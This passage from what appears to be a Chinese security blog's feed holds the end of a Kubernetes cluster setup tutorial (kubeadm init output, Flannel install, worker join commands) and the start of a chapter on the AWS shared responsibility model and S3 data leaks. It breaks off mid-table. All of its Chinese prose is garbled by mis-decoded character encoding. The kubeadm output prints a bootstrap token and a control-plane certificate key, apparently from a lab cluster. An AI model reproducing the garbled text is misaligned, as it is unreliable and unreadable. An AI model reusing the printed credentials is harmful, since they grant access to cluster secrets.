class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">[init] Using Kubernetes version: v1.32.0<br>[preflight] Running pre-flight checks<br>[preflight] Pulling images required <span class="hljs-keyword">for</span> setting up a Kubernetes cluster<br>[preflight] This might take a minute or two, depending on the speed of your internet connection<br>[preflight] You can also perform this action <span class="hljs-keyword">in</span> beforehand using <span class="hljs-string">&#x27;kubeadm config images pull&#x27;</span><br>[certs] Using certificateDir folder <span class="hljs-string">&quot;/etc/kubernetes/pki&quot;</span><br>[certs] Generating <span class="hljs-string">&quot;ca&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;apiserver&quot;</span> certificate and key<br>[certs] apiserver serving cert is signed <span class="hljs-keyword">for</span> DNS names [kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local ubuntu] and IPs [10.96.0.1 172.16.9.138]<br>[certs] Generating <span class="hljs-string">&quot;apiserver-kubelet-client&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;front-proxy-ca&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;front-proxy-client&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;etcd/ca&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;etcd/server&quot;</span> certificate and key<br>[certs] etcd/server serving cert is signed <span class="hljs-keyword">for</span> DNS names [localhost ubuntu] and IPs [172.16.9.138 127.0.0.1 ::1]<br>[certs] Generating <span class="hljs-string">&quot;etcd/peer&quot;</span> certificate and key<br>[certs] etcd/peer serving cert is signed <span class="hljs-keyword">for</span> DNS names [localhost ubuntu] and IPs [172.16.9.138 127.0.0.1 ::1]<br>[certs] Generating <span class="hljs-string">&quot;etcd/healthcheck-client&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;apiserver-etcd-client&quot;</span> certificate and key<br>[certs] Generating <span class="hljs-string">&quot;sa&quot;</span> key and public key<br>[kubeconfig] Using kubeconfig folder <span class="hljs-string">&quot;/etc/kubernetes&quot;</span><br>[kubeconfig] Writing <span class="hljs-string">&quot;admin.conf&quot;</span> kubeconfig file<br>[kubeconfig] Writing <span class="hljs-string">&quot;kubelet.conf&quot;</span> kubeconfig file<br>[kubeconfig] Writing <span class="hljs-string">&quot;controller-manager.conf&quot;</span> kubeconfig file<br>[kubeconfig] Writing <span class="hljs-string">&quot;scheduler.conf&quot;</span> kubeconfig file<br>[kubelet-start] Writing kubelet environment file with flags to file <span class="hljs-string">&quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span><br>[kubelet-start] Writing kubelet configuration to file <span class="hljs-string">&quot;/var/lib/kubelet/config.yaml&quot;</span><br>[kubelet-start] Starting the kubelet<br>[control-plane] Using manifest folder <span class="hljs-string">&quot;/etc/kubernetes/manifests&quot;</span><br>[control-plane] Creating static Pod manifest <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;kube-apiserver&quot;</span><br>[control-plane] Creating static Pod manifest <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;kube-controller-manager&quot;</span><br>[control-plane] Creating static Pod manifest <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;kube-scheduler&quot;</span><br>[etcd] Creating static Pod manifest <span class="hljs-keyword">for</span> <span class="hljs-built_in">local</span> etcd <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/etc/kubernetes/manifests&quot;</span><br>[wait-control-plane] Waiting <span class="hljs-keyword">for</span> the kubelet to boot up the control plane as static Pods from directory <span class="hljs-string">&quot;/etc/kubernetes/manifests&quot;</span>. This can take up to 4m0s<br>[apiclient] All control plane components are healthy after 22.501345 seconds<br>[upload-config] Storing the configuration used <span class="hljs-keyword">in</span> ConfigMap <span class="hljs-string">&quot;kubeadm-config&quot;</span> <span class="hljs-keyword">in</span> the <span class="hljs-string">&quot;kube-system&quot;</span> Namespace<br>[kubelet] Creating a ConfigMap <span class="hljs-string">&quot;kubelet-config&quot;</span> <span class="hljs-keyword">in</span> namespace kube-system with the configuration <span class="hljs-keyword">for</span> the kubelets <span class="hljs-keyword">in</span> the cluster<br>[upload-certs] Storing the certificates <span class="hljs-keyword">in</span> Secret <span class="hljs-string">&quot;kubeadm-certs&quot;</span> <span class="hljs-keyword">in</span> the <span class="hljs-string">&quot;kube-system&quot;</span> Namespace<br>[upload-certs] Using certificate key:<br>fdf05142753d40079d55cd5cf8ee1ae98a9a0c21cff77cb32cefbab87db97ebc<br>[mark-control-plane] Marking the node ubuntu as control-plane by adding the labels: [node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers]<br>[mark-control-plane] Marking the node ubuntu as control-plane by adding the taints [node-role.kubernetes.io/control-plane:NoSchedule]<br>[bootstrap-token] Using token: zwwasu.94c2jn07znyumkkq<br>[bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles<br>[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes<br>[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs <span class="hljs-keyword">in</span> order <span class="hljs-keyword">for</span> nodes to get long term certificate credentials<br>[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token<br>[bootstrap-token] Configured RBAC rules to allow certificate rotation <span class="hljs-keyword">for</span> all node client certificates <span class="hljs-keyword">in</span> the cluster<br>[bootstrap-token] Creating the <span class="hljs-string">&quot;cluster-info&quot;</span> ConfigMap <span class="hljs-keyword">in</span> the <span class="hljs-string">&quot;kube-public&quot;</span> namespace<br>[kubelet-finalize] Updating <span class="hljs-string">&quot;/etc/kubernetes/kubelet.conf&quot;</span> to point to a rotatable kubelet client certificate and key<br>[addons] Applied essential addon: CoreDNS<br>[addons] Applied essential addon: kube-proxy<br><br>Your Kubernetes control-plane has initialized successfully!<br><br>To start using your cluster, you need to run the following as a regular user:<br><br>  <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br>  <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br>  <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br><br>Alternatively, <span class="hljs-keyword">if</span> you are the root user, you can run:<br><br>  <span class="hljs-built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf<br><br>You should now deploy a pod network to the cluster.<br>Run <span class="hljs-string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> with one of the options listed at:<br>  https://kubernetes.io/docs/concepts/cluster-administration/addons/<br><br>You can now <span class="hljs-built_in">join</span> any number of the control-plane node running the following <span class="hljs-built_in">command</span> on each as root:<br><br>  kubeadm <span class="hljs-built_in">join</span> 172.16.9.138:6443 --token zwwasu.94c2jn07znyumkkq \<br>  --discovery-token-ca-cert-hash sha256:be429318cc8309484b4c8a2ed1811cf50747c1f30273af893d0b7724e7bce599 \<br>  --control-plane --certificate-key fdf05142753d40079d55cd5cf8ee1ae98a9a0c21cff77cb32cefbab87db97ebc<br><br>Please note that the certificate-key gives access to cluster sensitive data, keep it secret!<br>As a safeguard, uploaded-certs will be deleted <span class="hljs-keyword">in</span> two hours; If necessary, you can use<br><span class="hljs-string">&quot;kubeadm init phase upload-certs --upload-certs&quot;</span> to reload certs afterward.<br><br>Then you can <span class="hljs-built_in">join</span> any number of worker nodes by running the following on each as root:<br><br>kubeadm <span class="hljs-built_in">join</span> 172.16.9.138:6443 --token zwwasu.94c2jn07znyumkkq \<br>  --discovery-token-ca-cert-hash sha256:be429318cc8309484b4c8a2ed1811cf50747c1f30273af893d0b7724e7bce599<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x07-å®‰è£…-Flannel"><a href="#0x07-å®‰è£…-Flannel" class="headerlink" title="0x07 å®‰è£… Flannel"></a>0x07 å®‰è£… Flannel</h2><p>æ¥ä¸‹æ¥å°±æ˜¯å¯¼å‡º kubeconfig å¹¶å®‰è£… flannel äº†ã€‚</p><ol><li><p>åˆ›å»º kubeconfig å­˜æ”¾ç›®å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br></code></pre></td></tr></table></figure></li><li><p>å¤åˆ¶é›†ç¾¤ç®¡ç†å‘˜é…ç½®æ–‡ä»¶åˆ°å½“å‰ç”¨æˆ·ç›®å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br></code></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶æ‰€æœ‰æƒä¸ºå½“å‰ç”¨æˆ·ï¼Œé¿å…æƒé™é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br></code></pre></td></tr></table></figure></li><li><p>ä¸´æ—¶è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œè®© kubectl èƒ½è®¿é—®é›†ç¾¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨å®˜æ–¹ YAML æ¸…å•éƒ¨ç½² Flannel ç½‘ç»œæ’ä»¶ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">kubectl</span> <span class="hljs-string">apply</span> <span class="hljs-string">-f</span> <span class="hljs-string">https://github.com/coreos/flannel/raw/master/Documentation/kube-flannel.yml</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="0x08-åŠ å…¥å·¥ä½œèŠ‚ç‚¹"><a href="#0x08-åŠ å…¥å·¥ä½œèŠ‚ç‚¹" class="headerlink" title="0x08 åŠ å…¥å·¥ä½œèŠ‚ç‚¹"></a>0x08 åŠ å…¥å·¥ä½œèŠ‚ç‚¹</h2><ol><li><p>å¦‚æœä¹‹å‰çš„ä¿¡æ¯æ²¡æœ‰å¦¥å–„ä¿å­˜ï¼Œä¹Ÿå¯ä»¥åœ¨ master èŠ‚ç‚¹ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubeadm token create --print-join-command<br></code></pre></td></tr></table></figure></li><li><p>ä¸Šè¿°å‘½ä»¤å°†è¾“å‡ºç±»ä¼¼ä»¥ä¸‹å‘é›†ç¾¤ä¸­æ·»åŠ æ–°èŠ‚ç‚¹çš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬è¿˜éœ€æ·»åŠ  <code>--cri-socket unix:///var/run/cri-dockerd.sock</code> é€‰é¡¹ã€‚è¿™æ ·ï¼Œæ–°èŠ‚ç‚¹å°±èƒ½ä¸ä¸»èŠ‚ç‚¹é€šä¿¡ï¼Œå®ŒæˆåŠ å…¥æµç¨‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubeadm <span class="hljs-built_in">join</span> 172.16.9.138:6443 --token 84neth.yfb5hv7dxwbj2kex --discovery-token-ca-cert-hash sha256:68636eeb5e226fdbf10d339f08f928a37b998df47efba8624b9560c8816fce26 <br></code></pre></td></tr></table></figure></li></ol><p><img src="/image/image_5BJCNIrBza.png" alt="å›¾ 7ï¼šå·²æˆåŠŸå®‰è£…å¥½ä¸»èŠ‚ç‚¹å’Œå·¥ä½œèŠ‚ç‚¹" title="å›¾7ï¼šå·²æˆåŠŸå®‰è£…å¥½ä¸»èŠ‚ç‚¹å’Œå·¥ä½œèŠ‚ç‚¹"></p><h2 id="0x09-å‚è€ƒé“¾æ¥"><a href="#0x09-å‚è€ƒé“¾æ¥" class="headerlink" title="0x09 å‚è€ƒé“¾æ¥"></a>0x09 å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://blog.kubesimplify.com/kubernetes-125-dockerd">Kubernetes 1.25 + Dockerd Set up Kubernetes on Ubuntu 22.04 with Dockerd as the container runtime</a></li><li><a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">Installing kubeadm å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">Docker å®˜æ–¹æ–‡æ¡£ - ä½¿ç”¨ apt ä»“åº“ å®‰è£… Docker</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Kubernetes å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ 1 ç«  AWS è´£ä»»å…±æ‹…æ¨¡å‹</title>
    <link href="/2025/08/17/%E7%AC%AC-1-%E7%AB%A0-AWS-%E8%B4%A3%E4%BB%BB%E5%85%B1%E6%8B%85%E6%A8%A1%E5%9E%8B/"/>
    <url>/2025/08/17/%E7%AC%AC-1-%E7%AB%A0-AWS-%E8%B4%A3%E4%BB%BB%E5%85%B1%E6%8B%85%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬å°†æ¢è®¨ AWS è´£ä»»å…±æ‹…æ¨¡å‹ï¼Œå¹¶è¿›ä¸€æ­¥äº†è§£å®ƒä»¬å¯¹ <strong>äº‘å¹³å°æœ¬èº«çš„å®‰å…¨ï¼ˆSecurity Of Cloudï¼‰</strong> å’Œ <strong>äº‘ä¸­æ‰˜ç®¡çš„èµ„æºçš„å®‰å…¨ï¼ˆSecurity In Cloudï¼‰</strong> çš„å½±å“ï¼Œä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š</p><ul><li>äº†è§£ AWS ä¸­æ‰˜ç®¡çš„èµ„æºçš„å®‰å…¨ï¼›</li><li>äº†è§£ AWS è´£ä»»å…±æ‹…æ¨¡å‹ï¼›</li><li>äº†è§£ä¸åŒçš„æœåŠ¡éœ€è¦æ‰¿æ‹…çš„æˆ–å¤šæˆ–å°‘çš„å®‰å…¨è´£ä»»ï¼ˆä»å®¢æˆ·çš„è§’åº¦æ¥çœ‹ï¼‰ã€‚</li></ul><p>åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰ï¼Œæ‚¨éœ€è¦å¯¹ AWS æœåŠ¡ä»¥åŠ IaaSã€PaaS å’Œ SaaS äº‘æœåŠ¡æ¨¡å‹æœ‰åŸºæœ¬çš„äº†è§£ï¼Œä»¥ä¾¿äº†è§£ä¸åŒæ¨¡å‹ä¹‹é—´çš„ç»†å¾®å·®åˆ«ï¼Œå¹¶è¿›ä¸€æ­¥äº†è§£äº‘æä¾›å•†å’Œå®¢æˆ·ä¹‹é—´çš„å®‰å…¨è´£ä»»è½¬ç§»ã€‚</p><blockquote><p>IaaS æŒ‡çš„æ˜¯åŸºç¡€è®¾æ–½å³æœåŠ¡ï¼Œè‹±æ–‡å…¨ç§°ä¸º Infrastructure as a Service</p><p>PaaS æŒ‡çš„æ˜¯å¹³å°å³æœåŠ¡ï¼Œè‹±æ–‡å…¨ç§°ä¸º Platform as a Service</p><p>SaaS æŒ‡çš„æ˜¯è½¯ä»¶å³æœåŠ¡ï¼Œè‹±æ–‡å…¨ç§°ä¸º Software as a Service</p><p>FaaS æŒ‡çš„æ˜¯å‡½æ•°å³æœåŠ¡ï¼Œè‹±æ–‡å…¨ç§°ä¸º Function as a Service</p></blockquote><h2 id="0x01-èƒŒæ™¯"><a href="#0x01-èƒŒæ™¯" class="headerlink" title="0x01 èƒŒæ™¯"></a>0x01 èƒŒæ™¯</h2><h3 id="1-1-å…¬æœ‰äº‘å¸‚åœºçš„å‘å±•"><a href="#1-1-å…¬æœ‰äº‘å¸‚åœºçš„å‘å±•" class="headerlink" title="1.1 å…¬æœ‰äº‘å¸‚åœºçš„å‘å±•"></a>1.1 å…¬æœ‰äº‘å¸‚åœºçš„å‘å±•</h3><p>è¿‡å»åå¹´é—´ï¼Œå…¨å›½å…¬æœ‰äº‘å¸‚åœºå¢é•¿è¶…è¿‡åå€ã€‚2023 å¹´ï¼Œå…¨çƒå…¬æœ‰äº‘å¸‚åœºè§„æ¨¡çº¦ä¸º 6700 äº¿ç¾å…ƒï¼Œè€Œåˆ° 2024 å¹´ï¼Œè¿™ä¸€æ•°å­—å·²å¢è‡³ 8000 äº¿ç¾å…ƒã€‚</p><p>åœ¨ AI å¤§æ¨¡å‹å¿«é€Ÿå‘å±•çš„æ¨åŠ¨ä¸‹ï¼Œ2024 å¹´ä¸ŠåŠå¹´å…¨çƒå…¬æœ‰äº‘æœåŠ¡å¸‚åœºå®ç°äº† 20% çš„åŒæ¯”å¢é•¿ï¼Œå¹¶å‘ˆç°åŠ é€Ÿå¢é•¿çš„è¶‹åŠ¿ã€‚åŒæ—¶ï¼ŒAWSã€å¾®è½¯å’Œ Google ç­‰å…¨çƒé¢†å…ˆçš„äº‘æœåŠ¡æä¾›å•†ä» 2024 å¹´èµ·ä¹ŸåŠ å¿«äº†å‘å±•æ­¥ä¼ã€‚</p><p><img src="/image/image_p0Kj4gMdQV.png" alt="å›¾ 1-1 å…¨çƒå…¬æœ‰äº‘å¸‚åœºå˜åŒ–" title="å›¾ 1-1 å…¨çƒå…¬æœ‰äº‘å¸‚åœºå˜åŒ–"></p><p>åœ¨å…¬æœ‰äº‘å¸‚åœºä¸­ï¼ŒAWS å§‹ç»ˆå æ®é¢†å…ˆåœ°ä½ã€‚2024 å¹´ç¬¬ä¸‰å­£åº¦ï¼ŒAWS ä»¥ 31% çš„å¸‚åœºä»½é¢ç¨³å±…å…¨çƒé¦–ä½ã€‚æ›´å¤šç›¸å…³ä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://www.emma.ms/blog/cloud-market-share-trends" title="ã€Š2025å¹´å€¼å¾—å…³æ³¨çš„äº‘å¸‚åœºä»½é¢è¶‹åŠ¿ã€‹">ã€Š2025 å¹´å€¼å¾—å…³æ³¨çš„äº‘å¸‚åœºä»½é¢è¶‹åŠ¿ã€‹</a>ã€‚</p><p><img src="/image/image_11HIDHc7qr.png" alt="å›¾ 1-2 2024 å¹´ç¬¬ä¸‰å­£åº¦å…¨çƒä¸»è¦äº‘åŸºç¡€è®¾æ–½æœåŠ¡æä¾›å•†çš„å¸‚åœºä»½é¢" title="å›¾1-2 2024 å¹´ç¬¬ä¸‰å­£åº¦å…¨çƒä¸»è¦äº‘åŸºç¡€è®¾æ–½æœåŠ¡æä¾›å•†çš„å¸‚åœºä»½é¢"></p><p>åŒæ—¶ï¼Œå…¨çƒä¸»æƒ AI çš„å‘å±•ä»¥åŠä¸­å›½ã€ä¸­ä¸œéå’Œæ‹‰ç¾ç­‰åœ°åŒºçš„æ•°å­—åŒ–åŸºå»ºï¼Œéƒ½å°†æ¨åŠ¨å…¬æœ‰äº‘å¸‚åœºéœ€æ±‚çš„å¢é•¿ã€‚</p><iframe     src="//player.bilibili.com/player.html?isOutside=true&aid=114680794193447&bvid=BV1RxMyzQE5b&cid=30490955408&p=1"     scrolling="no"     border="0"     frameborder="no"     framespacing="0"     allowfullscreen="true"    width="100%"     height="500px"></iframe><p>Grand View é¢„æµ‹ï¼Œå…¨çƒå…¬æœ‰äº‘å¸‚åœºä» 2024 å¹´åˆ° 2030 å¹´çš„å¹´å¤åˆå¢é•¿ç‡é¢„è®¡ä¸º 17.0%ã€‚è€Œ IDC çš„é¢„æµ‹æ˜¾ç¤ºï¼Œ2024 å¹´è‡³ 2028 å¹´é—´ï¼Œè¿™ä¸€å¸‚åœºçš„å¹´å¤åˆå¢é•¿ç‡å°†è¾¾åˆ° 19.4%ï¼ŒæŒ‰ç…§æ­¤å¢é€Ÿï¼Œå¸‚åœºè§„æ¨¡å°†åœ¨ 2028 å¹´å®ç°ç¿»å€ã€‚æ›´å¤šè¯¦æƒ…è¯·å‚é˜…<a href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E6%B5%B7%E5%86%85%E5%A4%96%E4%BA%91%E5%8E%82%E5%95%86%E5%8F%91%E5%B1%95%E4%B8%8E%E7%8E%B0%E7%8A%B6%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AAI%E8%83%8C%E6%99%AF%E4%B8%8B%E8%B4%A2%E5%8A%A1%E6%95%B0%E6%8D%AE%E3%80%81%E4%BA%A7%E5%93%81%E5%B8%83%E5%B1%80%E4%B8%8E%E4%BC%B0%E5%80%BC%E5%8F%98%E5%8C%96.pdf" title=" æµ·å†…å¤–äº‘å‚å•†å‘å±•ä¸ç°çŠ¶ï¼ˆä¸€ï¼‰ï¼šAIèƒŒæ™¯ä¸‹è´¢åŠ¡æ•°æ®ã€äº§å“å¸ƒå±€ä¸ä¼°å€¼å˜åŒ–.pdf">ã€Šæµ·å†…å¤–äº‘å‚å•†å‘å±•ä¸ç°çŠ¶ï¼ˆä¸€ï¼‰ï¼šAI èƒŒæ™¯ä¸‹è´¢åŠ¡æ•°æ®ã€äº§å“å¸ƒå±€ä¸ä¼°å€¼å˜åŒ–ã€‹</a></p><h3 id="1-2-ä¼ä¸šä¸Šäº‘çš„å®‰å…¨æ€§é—®é¢˜"><a href="#1-2-ä¼ä¸šä¸Šäº‘çš„å®‰å…¨æ€§é—®é¢˜" class="headerlink" title="1.2 ä¼ä¸šä¸Šäº‘çš„å®‰å…¨æ€§é—®é¢˜"></a>1.2 ä¼ä¸šä¸Šäº‘çš„å®‰å…¨æ€§é—®é¢˜</h3><p>å…³äºä¼ä¸šå°†èµ„äº§è¿ç§»è‡³å…¬æœ‰äº‘çš„æ–‡ç« ã€ç™½çš®ä¹¦å’Œæ¡ˆä¾‹ç ”ç©¶å±‚å‡ºä¸ç©·ï¼Œé«˜å¯ç”¨æ€§ã€æŒ‰éœ€ä»˜è´¹ä»¥åŠå¿«é€Ÿå¼€å‘ç­‰æ¦‚å¿µä¹Ÿå·²è¢«å¹¿æ³›è®¨è®ºã€‚ç„¶è€Œï¼Œä¼ä¸šåœ¨ä¸Šäº‘è¿‡ç¨‹ä¸­æœ€å…·äº‰è®®çš„è¯é¢˜ä¾ç„¶æ˜¯å®‰å…¨æ€§é—®é¢˜ã€‚</p><p>2015 å¹´ï¼Œç¾å›½ä¸€å®¶å¤§å‹é“¶è¡Œçš„é¦–å¸­ä¿¡æ¯å®˜ç½—å¸ƒÂ·äºšå†å±±å¤§ï¼ˆRob Alexanderï¼‰åœ¨<a href="https://www.youtube.com/watch?v=0E90-ExySb8" title="ã€ŠAWS re:Invent 2015 ä¸»é¢˜æ¼”è®²ã€‹">ã€ŠAWS re:Invent 2015 ä¸»é¢˜æ¼”è®²ã€‹</a>ä¸­æåˆ°ï¼šâ€œåœ¨å…¬æœ‰äº‘ä¸Šè¿è¡Œåº”ç”¨æ¯”åœ¨æˆ‘ä»¬è‡ªå·±çš„æ•°æ®ä¸­å¿ƒæ›´ä¸ºå®‰å…¨ã€‚â€ç”±äºé“¶è¡Œä¸šå±äºé«˜åº¦ç›‘ç®¡è¡Œä¸šï¼Œè¿™ä¸€è§‚ç‚¹å…·å¤‡è¾ƒå¼ºçš„è¯´æœåŠ›ã€‚</p><p>Gartner åˆ†æå¸ˆ Lydia Leong åœ¨å…¶æ–‡ç« <a href="https://cloudpundit.com/2021/10/05/banks-are-accelerating-their-cloud-journeys/" title="ã€Šé“¶è¡Œæ­£åœ¨åŠ é€Ÿå…¶äº‘ä¹‹æ—…ã€‹">ã€Šé“¶è¡Œæ­£åœ¨åŠ é€Ÿå…¶äº‘ä¹‹æ—…ã€‹</a>ä¸­æŒ‡å‡ºï¼šâ€œâ€˜é“¶è¡Œä¸ä¼šå°†æ ¸å¿ƒä¸šåŠ¡è¿ç§»è‡³äº‘ç«¯â€™çš„è¯´æ³•æ­£é€æ¸è¢«æ‰“ç ´ã€‚â€</p><p>åŒæ—¶ï¼Œä¹Ÿæœ‰ä¼ä¸šåœ¨<a href="https://mp.weixin.qq.com/s/dRRYYa0PC0n5ckouGvMV9Q" title="ã€Šæ–°è§†è§’ä¸‹ä¼ä¸šäº‘åŒ–å®‰å…¨ç®¡æ§æ¡†æ¶OCBCã€‹">ã€Šæ–°è§†è§’ä¸‹ä¼ä¸šäº‘åŒ–å®‰å…¨ç®¡æ§æ¡†æ¶ OCBCã€‹</a>ä¸­è¡¨ç¤ºï¼šâ€œå·²å°†é“¶è¡Œæ ¸å¿ƒç³»ç»Ÿå…¨é¢éƒ¨ç½²åœ¨å…¬æœ‰äº‘ä¸Šã€‚â€</p><p>ç„¶è€Œï¼Œå„å¤§ä¼ä¸šåœ¨ AWS ä¸Šå‘ç”Ÿçš„æ•°æ®æ³„æ¼äº‹ä»¶ä»å±¡è§ä¸é²œã€‚æ›´å¤šç›¸å…³è¯¦æƒ…å¯å‚è€ƒå…¬å…±ä»“åº“<a href="https://github.com/nagwww/s3-leaks" title="s3-leaks">s3-leaks</a>ï¼Œå…¶ä¸­æ±‡æ€»äº† AWS S3 çš„æ•°æ®æ³„æ¼æ¡ˆä¾‹ã€‚</p><table><thead><tr><th>æ—¥æœŸ</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>2025 å¹´ 4 æœˆ</td><td>ä»ä¸€ä¸ª S3 æ¡¶ä¸­è·å–äº† AWS Access Key ID çš„æƒ³æ³•</td><td>AWS ç‹å›½çš„é’¥åŒ™</td></tr><tr><td>2023 å¹´ 10 æœˆ</td><td>å°åº¦å›½å®¶ç‰©æµé—¨æˆ·æš´éœ²äº†æ•æ„Ÿä¸ªäººæ•°æ®å’Œè´¸æ˜“è®°å½•</td><td>æš´éœ²äº†æ•æ„Ÿçš„ä¸ªäººæ•°æ®ä»¥åŠå¤šé¡¹å›½å®¶ä¸ç§äººè´¸æ˜“è®°å½•</td></tr><tr><td>2023 å¹´ 1 æœˆ</td><td>é£é©¬èˆªç©ºï¼ˆPegasus Airlinesï¼‰å›  S3 æ¡¶é…ç½®é”™è¯¯æ³„éœ²äº† 6.5TB æ•°æ®</td><td>èˆªç©ºå…¬å¸æ³„éœ²äº† 6.5TB æ•°æ®</td></tr><tr><td>2022 å¹´ 8 æœˆ</td><td>S3 æ¡¶é…ç½®é”™è¯¯å¯¼è‡´æš´éœ² 3TB æ•æ„Ÿæœºåœºæ•°æ®ï¼šâ€œç”Ÿå‘½å®‰å…¨å—åˆ°å¨èƒâ€</td><td>è¿™å¯çœŸæ˜¯å¾ˆå¤šæ•°æ®éƒ½å­˜æ”¾åœ¨ S3 